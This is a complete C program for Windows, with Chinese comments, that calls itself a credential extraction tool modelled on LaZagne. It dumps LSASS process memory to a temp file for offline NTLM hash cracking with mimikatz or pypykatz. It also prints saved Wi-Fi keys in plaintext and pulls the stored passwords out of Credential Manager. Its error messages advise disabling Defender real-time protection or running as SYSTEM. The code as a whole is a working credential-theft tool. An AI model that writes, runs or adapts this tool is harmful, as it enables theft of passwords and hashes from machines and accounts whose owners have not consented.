#include <windows.h>
#include <wlanapi.h>
#ifndef WLAN_PROFILE_GET_PLAINTEXT
#define WLAN_PROFILE_GET_PLAINTEXT 0x00000001
#endif
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <wincred.h>
#include <shlwapi.h>  // PathFileExists

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shlwapi.lib")

// ---------- 辅助函数 ----------
// 检查是否以管理员身份运行
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = {0};
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
            fRet = Elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return fRet;
}

// 启用 SeDebugPrivilege
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

// 查找进程 PID（不区分大小写）
DWORD GetProcessPid(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(processEntry);
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, procName) == 0) {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

// ---------- 模块1：LSASS 内存转储 ----------
void DumpLsass() {
    wprintf(L"\n[+] ===== 模块1: LSASS 内存转储 =====\n");
    if (!EnableDebugPrivilege()) {
        wprintf(L"[-] 启用 SeDebugPrivilege 失败，请以管理员身份运行。\n");
        return;
    }

    DWORD pid = GetProcessPid(L"lsass.exe");
    if (pid == 0) {
        wprintf(L"[-] 未找到 lsass.exe 进程。\n");
        return;
    }
    wprintf(L"[*] 找到 LSASS PID: %lu\n", pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        wprintf(L"[-] 打开进程失败，错误码: %lu。可能权限不足或进程受保护。\n", GetLastError());
        return;
    }

    wchar_t dumpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dumpPath);
    wcscat_s(dumpPath, MAX_PATH, L"lsass.dmp");
    HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] 创建转储文件失败，错误码: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        wprintf(L"[+] LSASS 转储成功 -> %ls (大小约 %llu 字节)\n", dumpPath, GetFileSize(hFile, NULL));
        wprintf(L"[*] 可离线使用 mimikatz 或 pypykatz 解析 NTLM 哈希。\n");
    } else {
        DWORD err = GetLastError();
        wprintf(L"[-] MiniDumpWriteDump 失败，错误码: 0x%08X (%lu)\n", err, err);
        if (err == 0x80070005) wprintf(L"    解释: 拒绝访问。请确认已关闭 Defender 实时保护或添加排除。\n");
        else if (err == 0x80004005) wprintf(L"    解释: 未指定错误。尝试以 SYSTEM 身份运行(psexec -s)。\n");
    }
    CloseHandle(hFile);
    CloseHandle(hProcess);
}

// ---------- 模块2：Wi-Fi 明文密码 ----------
void DumpWifiPasswords() {
    wprintf(L"\n[+] ===== 模块2: Wi-Fi 明文密码 =====\n");
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2, dwCurVersion = 0;
    if (WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS) {
        wprintf(L"[-] WlanOpenHandle 失败，请确认 WLAN AutoConfig 服务正在运行。\n");
        return;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS) {
        wprintf(L"[-] 未找到无线网卡接口。\n");
        WlanCloseHandle(hClient, NULL);
        return;
    }

    int found = 0;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                WLAN_PROFILE_INFO profile = pProfileList->ProfileInfo[j];
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT;
                DWORD granted = 0;
                LPWSTR xml = NULL;
                if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, profile.strProfileName, NULL, &xml, &flags, &granted) == ERROR_SUCCESS) {
                    // 解析 <keyMaterial> 内容，处理可能的空白字符
                    wchar_t* keyStart = wcsstr(xml, L"<keyMaterial>");
                    if (keyStart) {
                        keyStart += wcslen(L"<keyMaterial>");
                        while (*keyStart && iswspace(*keyStart)) keyStart++;
                        wchar_t* keyEnd = wcsstr(keyStart, L"</keyMaterial>");
                        if (keyEnd) {
                            while (keyEnd > keyStart && iswspace(*(keyEnd - 1))) keyEnd--;
                            wchar_t saved = *keyEnd;
                            *keyEnd = L'\0';
                            wprintf(L"[+] SSID: %-20ls -> 密码: %ls\n", profile.strProfileName, keyStart);
                            *keyEnd = saved;
                            found++;
                        } else {
                            wprintf(L"[?] SSID: %-20ls -> 有 <keyMaterial> 但找不到结束标签\n", profile.strProfileName);
                        }
                    } else {
                        // 可能是开放网络或企业认证
                        wprintf(L"[i] SSID: %-20ls -> 无密码（开放网络或证书认证）\n", profile.strProfileName);
                    }
                    WlanFreeMemory(xml);
                }
            }
            WlanFreeMemory(pProfileList);
        }
    }
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    if (found == 0) wprintf(L"[-] 未找到任何保存明文密码的 Wi-Fi 配置文件。\n");
}

// ---------- 模块3：Windows Credential Manager 凭据 ----------
void DumpCredentialManager() {
    wprintf(L"\n[+] ===== 模块3: 凭据管理器 (Credential Manager) =====\n");
    PCREDENTIALW *creds = NULL;
    DWORD count = 0;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) {
        wprintf(L"[-] CredEnumerate 失败，错误码: %lu (可能无凭据或权限不足)\n", GetLastError());
        return;
    }

    int found = 0;
    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW cred = creds[i];
        wprintf(L"[*] 目标: %ls\n", cred->TargetName);
        wprintf(L"    类型: ");
        switch (cred->Type) {
            case CRED_TYPE_GENERIC:         wprintf(L"通用凭据"); break;
            case CRED_TYPE_DOMAIN_PASSWORD: wprintf(L"域密码"); break;
            case CRED_TYPE_DOMAIN_CERTIFICATE: wprintf(L"域证书"); break;
            default: wprintf(L"其他 (%lu)", cred->Type);
        }
        wprintf(L"\n    用户名: %ls\n", cred->UserName ? cred->UserName : L"(空)");
        if (cred->CredentialBlobSize > 0 && cred->CredentialBlob) {
            // 密码可能是宽字符或普通字节，此处假设为普通文本（通用凭据常为明文）
            wchar_t* pwd = (wchar_t*)cred->CredentialBlob;
            // 简单判断是否可能为宽字符串（末尾有双零）
            BOOL isWide = (cred->CredentialBlobSize % 2 == 0) && 
                          (cred->CredentialBlobSize >= 2) &&
                          (pwd[cred->CredentialBlobSize/2 - 1] == 0);
            if (isWide) {
                wprintf(L"    密码: %ls\n", pwd);
            } else {
                // 输出为 ANSI 字节
                printf("    密码(ANSI): %.*s\n", cred->CredentialBlobSize, (char*)cred->CredentialBlob);
            }
            found++;
        } else {
            wprintf(L"    密码: (无)\n");
        }
        wprintf(L"\n");
    }
    CredFree(creds);
    if (found == 0) wprintf(L"[-] 未提取到任何含密码的凭据。\n");
}

// ---------- 模块4：DPAPI 加解密演示 ----------
void DemonstrateDPAPI() {
    wprintf(L"\n[+] ===== 模块4: DPAPI 加解密演示 =====\n");
    char secret[] = "ThisIsMySecret_DPAPI_Demo";
    DATA_BLOB in = { (BYTE*)secret, (DWORD)strlen(secret)+1 };
    DATA_BLOB encrypted = {0}, decrypted = {0};

    if (!CryptProtectData(&in, L"测试描述", NULL, NULL, NULL, 0, &encrypted)) {
        wprintf(L"[-] CryptProtectData 失败，错误码: %lu\n", GetLastError());
        return;
    }
    wprintf(L"[*] 加密成功，加密数据大小: %lu 字节\n", encrypted.cbData);

    if (!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted)) {
        wprintf(L"[-] CryptUnprotectData 失败，错误码: %lu\n", GetLastError());
        LocalFree(encrypted.pbData);
        return;
    }
    wprintf(L"[+] 解密成功，原始数据: %s\n", (char*)decrypted.pbData);
    LocalFree(encrypted.pbData);
    LocalFree(decrypted.pbData);
}

// ---------- 主函数 ----------
int main() {
    // 设置控制台为 UTF-8 以便宽字符输出正确
    SetConsoleOutputCP(CP_UTF8);
    wprintf(L"=========================================================\n");
    wprintf(L"     Windows 凭据提取工具 v2.0 (类似 LaZagne 核心功能)   \n");
    wprintf(L"=========================================================\n");

    if (!IsElevated()) {
        wprintf(L"\n[-] 当前未以管理员身份运行！\n");
        wprintf(L"    请右键 -> “以管理员身份运行” 后重试。\n");
        wprintf(L"    按任意键退出...");
        getwchar();
        return 1;
    }
    wprintf(L"[+] 已获得管理员权限，继续执行...\n");

    DumpLsass();
    DumpWifiPasswords();
    DumpCredentialManager();
    DemonstrateDPAPI();

    wprintf(L"\n[*] 所有模块执行完毕。\n");
    wprintf(L"[!] 注意：LSASS 转储文件位于 %%TEMP%%\\lsass.dmp，请妥善保管并清理。\n");
    // 可选：询问是否删除转储文件
    // wprintf(L"是否删除 LSASS 转储文件？(y/n): ");
    // if (getwchar() == L'y') DeleteFileW(dumpPath);
    return 0;
}
